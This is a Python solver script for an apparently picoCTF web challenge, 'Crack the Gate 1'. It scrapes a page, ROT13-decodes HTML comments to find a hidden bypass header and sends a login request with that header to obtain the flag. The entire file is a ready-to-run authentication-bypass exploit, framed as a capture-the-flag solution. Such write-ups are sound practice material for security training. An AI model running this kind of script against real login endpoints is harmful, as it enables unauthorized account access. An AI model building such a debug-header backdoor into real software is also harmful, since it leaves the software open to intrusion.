import requests
import re
import codecs

def rot13(text):
    return codecs.encode(text, 'rot_13')

def solve_crack_the_gate_1(base_url):
    print(f"[*] Targeting: {base_url}")
    
    # 1. Fetch the main page and look for the ROT13 comment
    try:
        response = requests.get(base_url)
        response.raise_for_status()
    except Exception as e:
        print(f"[!] Error accessing URL: {e}")
        return

    # Look for the pattern: "ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf""
    # The prefix "ABGR" is actually "NOTE" in ROT13.
    comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
    
    hint_found = False
    header_name = None
    header_value = None

    for comment in comments:
        decoded = rot13(comment.strip())
        print(f"[*] Decoded comment: {decoded}")
        
        # Look for the header pattern in the decoded text
        match = re.search(r'header\s+"(.*?):\s*(.*?)"', decoded, re.IGNORECASE)
        if match:
            header_name = match.group(1)
            header_value = match.group(2)
            hint_found = True
            print(f"[+] Found bypass header: {header_name}: {header_value}")
            break

    if not hint_found:
        print("[!] No bypass hint found in page source.")
        return

    # 2. Perform the exploit
    login_url = f"{base_url.rstrip('/')}/login"
    payload = {
        "email": "ctf-player@picoctf.org",
        "password": "pico_solver_auto"
    }
    headers = {
        header_name: header_value,
        "Content-Type": "application/json"
    }

    print(f"[*] Sending exploit to {login_url}...")
    try:
        res = requests.post(login_url, json=payload, headers=headers)
        if res.status_code == 200:
            data = res.json()
            if "flag" in data:
                print(f"[SUCCESS] Flag found: {data['flag']}")
            else:
                print(f"[?] Request succeeded but no flag in response: {res.text}")
        else:
            print(f"[!] Exploit failed with status code {res.status_code}")
            print(res.text)
    except Exception as e:
        print(f"[!] Error during exploit: {e}")

def web_solve(params):
    url = params.get('url')
    if not url: return {"success": False, "error": "URL required"}
    # Re-use existing logic, capture output
    import io, sys
    old_stdout = sys.stdout
    sys.stdout = buffer = io.StringIO()
    solve_crack_the_gate_1(url)
    sys.stdout = old_stdout
    output = buffer.getvalue()
    if "picoCTF{" in output:
        flag = "picoCTF{" + output.split("picoCTF{")[1].split("}")[0] + "}"
        return {"success": True, "flag": flag, "log": output}
    else:
        return {"success": False, "error": "Flag not found.", "log": output}

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1: solve_crack_the_gate_1(sys.argv[1])
